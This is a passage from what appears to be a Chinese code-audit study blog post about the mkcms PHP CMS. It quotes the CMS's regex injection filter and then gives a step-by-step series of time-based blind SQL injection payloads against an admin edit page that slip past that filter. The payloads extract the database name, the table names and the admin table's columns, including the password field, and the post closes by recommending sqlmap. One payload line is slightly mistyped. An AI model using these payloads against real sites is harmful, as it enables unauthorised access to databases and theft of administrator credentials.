class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br></pre></td></tr></table></figure>

<p>看见这段代码我是懵逼的，仔细看了下发现貌似是过滤整条SQL语句。。不确定就问了下大佬，的确是，不止是过滤sql语句也过滤xss，嗯，对大佬说这是很简单的一个正则表达式(我真垃圾，正则后面还是得好好学一波。。)</p>
<p>可以看见这段正则匹配完整的SQL语句大致把常规的增删改查都给过滤了，盲注中的延时注入或布尔注入都阔以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入</span><br><span class="line">	payload:</span><br><span class="line">		and if(length(database())&#x3D;6,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;6 页面延时10秒，失败</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeale0dojj31eg0u04bn.jpg" alt="image-20200602220203248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	and if(length(database())&#x3D;5,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;5 页面延时10秒,成功</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeakjmssjj31j50u0anf.jpg" alt="image-20200602220111981"></p>
<p>验证是存在注入，并且可以用延时注入绕过正则匹配。此处需配合ascii码表来进行测试，如果对应字母的ascii码正确不会延时，错误会延时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称</span><br><span class="line">	payload:http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;101,0,sleep(10))&#x2F;&#x2F;错误延时10秒</span><br></pre></td></tr></table></figure>

<p>101==e，而数据库第一个字符为m==109</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeax8nlv6j31fx0u0qgd.jpg" alt="image-20200602221326238"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;109,0,sleep(10))&#x2F;&#x2F;正确立即返回</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeayize5oj31iw0u0tju.jpg" alt="image-20200602221440660"></p>
<p>以此类推</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库第二个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),2,1))&#x3D;107,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第三个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),3,1))&#x3D;99,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第四个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),4,1))&#x3D;109,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第五个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),5,1))&#x3D;115,0,sleep(10))</span><br><span class="line">	</span><br><span class="line">数据库名称为：mkcms</span><br></pre></td></tr></table></figure>

<p>判断数据库中一共有多少张表，由于cms过滤了引号，所以将数据库名转成hex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;0x6D6B636D73)&#x3D;17,sleep(5),0)&#x2F;&#x2F;如果数据库中有17个表，延时5秒</span><br></pre></td></tr></table></figure>



<p>查询数据库的第一个表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">&#x2F;&#x2F;判断数据库第一张表名长度为8</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;8,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一张表的对应字符为对应ascii码，立即返回，反之延时5秒</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;k</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),2,1)))&#x3D;107,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;c</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),3,1)))&#x3D;99,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),4,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;s</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),5,1)))&#x3D;115,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),6,1)))&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),7,1)))&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),8,1)))&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">得出数据库第一张表名为：mkcms_ad</span><br></pre></td></tr></table></figure>

<p>逐步查询多个表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询第n个表的表名长度,修改n即可</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;个数,0,sleep(5))</span><br><span class="line">查询第n个表的表名，修改n即可</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,n)))&#x3D;ascii码,0,sleep(5))</span><br></pre></td></tr></table></figure>



<p>查询列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询mkcms_manager共有9列</span><br><span class="line">	and if((select count(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572)&#x3D;9,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;判断第一个列名的长度</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0,1)&#x3D;4,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断某个列名长度，修改即可</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit n,1)&#x3D;长度,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第一个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;i</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;105,0,sleep(5)i</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第一个列名为：m_id</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第二个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;n</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;110,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,5(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;e</span><br><span class="line">and if((select ascii(substr(column_name,6(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;101,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第二个列名为m_name，以此类推</span><br><span class="line">第三个列名为m_password</span><br><span class="line">第四个列名为m_levels</span><br><span class="line">第五个列名为m_random</span><br><span class="line">第六个列名为m_status</span><br><span class="line">第七个列名为m_logintime</span><br><span class="line">第八个列名为m_loginip</span><br><span class="line">第九个列名为m_loginnum</span><br><span class="line"></span><br><span class="line">判断字段中值的长度</span><br><span class="line">and if((SELEct length(id) FRom mkcms_userka limit 0,1)&#x3D;1,0,sleep(5))</span><br><span class="line"></span><br><span class="line">查询字段中的值</span><br><span class="line">and if((select ascii(substr(id,1,1)) from mkcms_userka limit 0,1)&#x3D;49,0,sleep(5))</span><br><span class="line"></span><br><span class="line">其他以此类推</span><br></pre></td></tr></table></figure>

<p>由于手工太麻烦，建议使用sqlmap一把梭</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
</search>
